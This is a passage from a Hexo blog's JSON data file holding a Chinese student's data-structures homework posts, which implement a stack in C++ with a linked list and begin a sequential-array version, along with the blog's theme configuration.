SElemType;\ntypedef int ElemType;\nusing namespace std;\ntypedef struct StackNode\n{\n\tElemType data;\n\tstruct StackNode *next;\n}StackNode,*LinkStack;\nStatus InitStack(LinkStack &S)\n{\n\tS=NULL;\n\treturn OK;\n}\nStatus Push(LinkStack &S,SElemType e)\n{\n\tLinkStack p=new StackNode;\n\tp->data=e;\n\tp->next=S;\n\tS=p;\n\treturn OK;\n}\nStatus Pop(LinkStack &S,SElemType &e)\n{\n\tif(S==NULL)return ERROR;\n\te=S->data;\n\tLinkStack p=S;\n\tS=S->next;\n\tdelete p;\n\treturn OK;\n}\nSElemType GetTop(LinkStack S)\n{\n\tif(S!=NULL)\n\t\treturn S->data;\n}\nint main()\n{\n\tLinkStack S;\n\tInitStack(S);\n\tint N,ch;\n\tprintf(\"1.入栈\\n2.出栈\\n3.取栈顶元素\\n0.退出\\n\");\n\twhile(scanf(\"%d\",&ch)!=EOF)\n\t{\n\t\tElemType e;\n\t\tif(ch==1)\n\t\t{\n\t\t\tprintf(\"请输入入栈数目！\\n\");\n\t\t\tscanf(\"%d\",&N);\n\t\t\tprintf(\"请输入%d个数按顺序入栈！\\n\",N);\n\t\t\twhile(N--)\n\t\t\t{\n\t\t\t\tscanf(\"%d\",&e);\n\t\t\t\tPush(S,e);\n\t\t\t}\n\t\t\tprintf(\"OK!\\n\");\n\t\t}\n\t\telse if(ch==2)\n\t\t{\n\t\t\tif(!Pop(S,e))printf(\"栈为空！\\n\");\n\t\t\telse printf(\"出栈元素为%d\\n\",e);\n\t\t}\n\t\telse if(ch==3)printf(\"栈顶元素为%d!\\n\",GetTop(S));\n\t\telse break;\n\t}\n\treturn 0;\n}\n```","source":"_posts/链表实现栈.md","raw":"---\ntitle: 链表实现栈\ndate: 2019-03-29 17:11:09\ncategories:\n  - 数据结构\ntags:\n  - 链表\n  - 栈\nabbrlink: 25d78577\nupdated:\n---\n# 链表实现栈\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n# 代码\n```cpp\n#include<iostream>\n#define OK 1;\n#define ERROR 0;\ntypedef int Status;\ntypedef int SElemType;\ntypedef int ElemType;\nusing namespace std;\ntypedef struct StackNode\n{\n\tElemType data;\n\tstruct StackNode *next;\n}StackNode,*LinkStack;\nStatus InitStack(LinkStack &S)\n{\n\tS=NULL;\n\treturn OK;\n}\nStatus Push(LinkStack &S,SElemType e)\n{\n\tLinkStack p=new StackNode;\n\tp->data=e;\n\tp->next=S;\n\tS=p;\n\treturn OK;\n}\nStatus Pop(LinkStack &S,SElemType &e)\n{\n\tif(S==NULL)return ERROR;\n\te=S->data;\n\tLinkStack p=S;\n\tS=S->next;\n\tdelete p;\n\treturn OK;\n}\nSElemType GetTop(LinkStack S)\n{\n\tif(S!=NULL)\n\t\treturn S->data;\n}\nint main()\n{\n\tLinkStack S;\n\tInitStack(S);\n\tint N,ch;\n\tprintf(\"1.入栈\\n2.出栈\\n3.取栈顶元素\\n0.退出\\n\");\n\twhile(scanf(\"%d\",&ch)!=EOF)\n\t{\n\t\tElemType e;\n\t\tif(ch==1)\n\t\t{\n\t\t\tprintf(\"请输入入栈数目！\\n\");\n\t\t\tscanf(\"%d\",&N);\n\t\t\tprintf(\"请输入%d个数按顺序入栈！\\n\",N);\n\t\t\twhile(N--)\n\t\t\t{\n\t\t\t\tscanf(\"%d\",&e);\n\t\t\t\tPush(S,e);\n\t\t\t}\n\t\t\tprintf(\"OK!\\n\");\n\t\t}\n\t\telse if(ch==2)\n\t\t{\n\t\t\tif(!Pop(S,e))printf(\"栈为空！\\n\");\n\t\t\telse printf(\"出栈元素为%d\\n\",e);\n\t\t}\n\t\telse if(ch==3)printf(\"栈顶元素为%d!\\n\",GetTop(S));\n\t\telse break;\n\t}\n\treturn 0;\n}\n```","slug":"链表实现栈","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkeh004dqse5b6z3hxf1","content":"<h1 id=\"链表实现栈\"><a href=\"#链表实现栈\" class=\"headerlink\" title=\"链表实现栈\"></a>链表实现栈</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id=\"more\"></a></p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> OK 1;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> ERROR 0;</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> Status;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> SElemType;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> ElemType;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">StackNode</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\tElemType data;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">StackNode</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\">&#125;StackNode,*LinkStack;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">InitStack</span><span class=\"params\">(LinkStack &amp;S)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tS=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">Push</span><span class=\"params\">(LinkStack &amp;S,SElemType e)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLinkStack p=<span class=\"keyword\">new</span> StackNode;</span><br><span class=\"line\">\tp-&gt;data=e;</span><br><span class=\"line\">\tp-&gt;next=S;</span><br><span class=\"line\">\tS=p;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">Pop</span><span class=\"params\">(LinkStack &amp;S,SElemType &amp;e)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(S==<span class=\"literal\">NULL</span>)<span class=\"keyword\">return</span> ERROR;</span><br><span class=\"line\">\te=S-&gt;data;</span><br><span class=\"line\">\tLinkStack p=S;</span><br><span class=\"line\">\tS=S-&gt;next;</span><br><span class=\"line\">\t<span class=\"keyword\">delete</span> p;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">SElemType <span class=\"title\">GetTop</span><span class=\"params\">(LinkStack S)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(S!=<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> S-&gt;data;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLinkStack S;</span><br><span class=\"line\">\tInitStack(S);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> N,ch;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1.入栈\\n2.出栈\\n3.取栈顶元素\\n0.退出\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;ch)!=EOF)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tElemType e;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(ch==<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入入栈数目！\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;N);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入%d个数按顺序入栈！\\n&quot;</span>,N);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">while</span>(N--)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;e);</span><br><span class=\"line\">\t\t\t\tPush(S,e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;OK!\\n&quot;</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(ch==<span class=\"number\">2</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(!Pop(S,e))<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;栈为空！\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;出栈元素为%d\\n&quot;</span>,e);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(ch==<span class=\"number\">3</span>)<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;栈顶元素为%d!\\n&quot;</span>,GetTop(S));</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1287,"excerpt":"<h1 id=\"链表实现栈\"><a href=\"#链表实现栈\" class=\"headerlink\" title=\"链表实现栈\"></a>链表实现栈</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br>","more":"</p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> OK 1;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> ERROR 0;</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> Status;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> SElemType;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> ElemType;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">StackNode</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\tElemType data;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">StackNode</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\">&#125;StackNode,*LinkStack;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">InitStack</span><span class=\"params\">(LinkStack &amp;S)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tS=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">Push</span><span class=\"params\">(LinkStack &amp;S,SElemType e)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLinkStack p=<span class=\"keyword\">new</span> StackNode;</span><br><span class=\"line\">\tp-&gt;data=e;</span><br><span class=\"line\">\tp-&gt;next=S;</span><br><span class=\"line\">\tS=p;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">Pop</span><span class=\"params\">(LinkStack &amp;S,SElemType &amp;e)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(S==<span class=\"literal\">NULL</span>)<span class=\"keyword\">return</span> ERROR;</span><br><span class=\"line\">\te=S-&gt;data;</span><br><span class=\"line\">\tLinkStack p=S;</span><br><span class=\"line\">\tS=S-&gt;next;</span><br><span class=\"line\">\t<span class=\"keyword\">delete</span> p;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">SElemType <span class=\"title\">GetTop</span><span class=\"params\">(LinkStack S)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(S!=<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> S-&gt;data;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLinkStack S;</span><br><span class=\"line\">\tInitStack(S);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> N,ch;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1.入栈\\n2.出栈\\n3.取栈顶元素\\n0.退出\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;ch)!=EOF)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tElemType e;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(ch==<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入入栈数目！\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;N);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入%d个数按顺序入栈！\\n&quot;</span>,N);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">while</span>(N--)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;e);</span><br><span class=\"line\">\t\t\t\tPush(S,e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;OK!\\n&quot;</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(ch==<span class=\"number\">2</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(!Pop(S,e))<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;栈为空！\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;出栈元素为%d\\n&quot;</span>,e);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(ch==<span class=\"number\">3</span>)<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;栈顶元素为%d!\\n&quot;</span>,GetTop(S));</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"顺序表实现栈","date":"2019-03-29T09:11:09.000Z","abbrlink":"924b455d","updated":"2020-04-08T10:40:24.000Z","_content":"# 顺序表实现栈\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include <stdio.h>\n#include <malloc.h>\ntypedef int SElemType;\ntypedef int Status;\n#define INIT_SIZE 100\n#define STACKINCREMENT 10\n#define Ok 1\n#define Error 0\n#define True 1\n#define False 0\ntypedef struct\n{\n    SElemType *base;\n    SElemType *top;\n    int stacksize;\n}SqStack;\nStatus InitStack(SqStack *s)\n{\n    s->base = (SElemType *)malloc(INIT_SIZE * sizeof(SElemType));\n    if(!s->base)\n    {\n        puts(\"存储空间分配失败！\");\n        return Error;\n    }\n    s->top = s->base;\n    s->stacksize = INIT_SIZE;\n    return Ok;\n}\nStatus ClearStack(SqStack *s)\n{\n    s->top = s->base;\n    return Ok;\n}\nStatus StackEmpty(SqStack *s)\n{\n    if(s->top == s->base)\n        return True;\n    else return False;\n}\nStatus Destroy(SqStack *s)\n{\n    free(s->base);\n    s->base = NULL;\n    s->top = NULL;\n    